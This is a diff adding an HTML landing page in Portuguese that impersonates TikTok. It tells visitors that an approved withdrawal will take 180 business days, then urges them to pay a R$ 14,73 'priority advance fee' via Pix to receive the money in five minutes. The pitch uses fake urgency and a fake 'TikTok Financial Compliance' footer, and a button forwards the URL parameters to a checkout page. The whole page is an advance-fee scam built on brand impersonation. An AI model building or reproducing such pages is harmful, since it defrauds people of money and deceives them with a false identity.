@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - Antecipação</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;600;700;800;900&display=swap');
+        
+        body { 
+            font-family: 'Figtree', sans-serif; 
+            margin: 0; 
+            background-color: #000; 
+            color: white;
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* EFEITO DE CORES TIKTOK */
+        .animated-gradient {
+            background: linear-gradient(to right, #FE2C55 0%, #25F4EE 33%, #ffffff 66%, #FE2C55 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: flowing 2s linear infinite;
+        }
+
+        @keyframes flowing {
+            to { background-position: 200% center; }
+        }
+
+        /* PULSO DE ATENÇÃO */
+        .pulse-tiktok { 
+            animation: pulse-border 2s infinite; 
+            border-bottom: 4px solid #FE2C55;
+        }
+        
+        @keyframes pulse-border {
+            0% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(254, 44, 85, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0); }
+        }
+
+        .card-premium {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .btn-tiktok {
+            background-color: #FE2C55;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .btn-tiktok:active {
+            transform: scale(0.96);
+        }
+
+        .logo-giant {
+            filter: drop-shadow(0 0 15px rgba(255,255,255,0.2));
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <div class="bg-[#CC0000] text-white text-center py-3 px-4 text-[13px] font-[900] uppercase tracking-tighter w-full sticky top-0 z-50">
+        ⚠️ PRAZO DE SAQUE PADRÃO: 180 DIAS ÚTEIS
+    </div>
+
+    <div class="max-w-md mx-auto w-full flex-grow pb-12 px-6">
+        
+        <div class="flex justify-center py-10">
+            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" class="h-24 filter brightness-0 invert logo-giant" alt="TikTok">
+        </div>
+
+        <div class="text-center mb-8">
+            <div class="text-5xl mb-4">⏳</div>
+            <h1 class="text-3xl font-black leading-tight italic uppercase tracking-tighter">
+                Antecipação de <br><span class="text-[#25F4EE]">Saque Imediato</span>
+            </h1>
+        </div>
+
+        <div class="card-premium rounded-[2rem] p-7 mb-8 text-[15px] text-gray-300 leading-relaxed font-medium border-l-4 border-[#25F4EE]">
+            <p class="mb-4 text-white">Seu saque foi aprovado com sucesso e será processado em até <b>180 dias úteis</b>.</p>
+            
+            <p class="mb-4">Deseja evitar a espera e receber <b>IMEDIATAMENTE</b>?</p>
+            
+            <p>Ative agora a antecipação e receba em até <b>5 minutos</b> na sua chave Pix.</p>
+            
+            <p class="mt-4 text-[#FE2C55] font-black text-xs uppercase tracking-widest">⚠️ Oferta válida somente nesta etapa.</p>
+        </div>
+
+        <div class="bg-white rounded-[2rem] p-8 text-black text-center mb-10 pulse-tiktok shadow-[0_20px_50px_rgba(254,44,85,0.3)]">
+            <span class="text-[10px] uppercase font-black tracking-[0.2em] text-gray-400">Receber via Pix em:</span>
+            <div class="text-5xl font-[1000] my-2 animated-gradient" style="-webkit-text-fill-color: initial; background-clip: initial; color: #000;">5 MINUTOS</div>
+            <div class="inline-block bg-black text-[#25F4EE] px-4 py-1 rounded-full text-[10px] font-black tracking-widest">
+                LIBERAÇÃO DISPONÍVEL
+            </div>
+        </div>
+
+        <div class="text-center mb-10">
+            <p class="text-gray-500 text-[11px] font-black uppercase tracking-widest mb-1">Taxa de Antecipação Prioritária</p>
+            <div class="text-5xl font-black animated-gradient italic">
+                R$ 14,73
+            </div>
+        </div>
+
+        <a href="#" onclick="irParaCheckout(event)"  class="btn-tiktok block w-full text-white text-center py-7 rounded-full shadow-2xl font-[900] text-xl uppercase tracking-tighter transition-all">
+            ✅ ANTECIPAR SAQUE AGORA
+        </a>
+
+        <div class="mt-12 text-center px-4">
+            <p class="text-[9px] font-bold text-gray-500 uppercase tracking-[0.3em] mb-4">TikTok Financial Compliance © 2026</p>
+            <p class="text-[11px] text-gray-400 leading-relaxed italic border-t border-white/10 pt-6">
+                A antecipação é um serviço opcional para acelerar o processamento de fundos via Banco Central. Caso não aceite, o prazo de 180 dias será mantido.
+            </p>
+        </div>
+    </div>
+
+<script>
+function irParaCheckout(event) {
+  event.preventDefault();
+  var dest = new URL('checkout.html', window.location.href);
+  new URLSearchParams(window.location.search).forEach(function(v, k) { dest.searchParams.set(k, v); });
+  window.location.href = dest.toString();
+}
+</script>
+
+</body>
+</html>
